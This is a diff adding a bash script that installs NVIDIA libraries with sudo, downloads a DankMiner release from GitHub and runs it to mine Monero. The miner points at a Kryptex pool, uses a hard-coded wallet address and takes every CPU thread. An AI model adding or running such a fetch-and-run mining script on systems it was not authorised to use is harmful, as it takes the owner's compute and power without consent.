@@ -1,0 +1,10 @@
+#!/bin/bash
+apt update && apt -y install unzip wget curl libncurses6 libncursesw6 sudo
+curl http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-graphics-drivers-550-server/libnvidia-compute-550-server_550.54.15-0ubuntu2_amd64.deb -L -o libnvidia-compute-550-server_550.54.15-0ubuntu2_amd64.deb
+sudo dpkg -i libnvidia-compute-550-server_550.54.15-0ubuntu2_amd64.deb
+curl http://ftp.us.debian.org/debian/pool/non-free/n/nvidia-cuda-toolkit/libnvrtc11.2_11.2.152~11.2.2-3+deb11u3_amd64.deb -L -o libnvrtc11.2_11.2.152~11.2.2-3+deb11u3_amd64.deb
+sudo dpkg -i libnvrtc11.2_11.2.152~11.2.2-3+deb11u3_amd64.deb
+curl https://github.com/DankMiner/DankMiner/releases/download/DankMinerV1.4.4/DankMiner-v1.4.4a-Linux.tar.gz -L -o DankMiner-v1.4.4a-Linux.tar.gz
+tar xf DankMiner-v1.4.4a-Linux.tar.gz
+cd DankMiner-v1.4.4a-Linux
+./dankminer -a xmr -w 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK/xx -p stratum+tcp://xmr.kryptex.network:7029 --cpu-threads $(nproc --all)
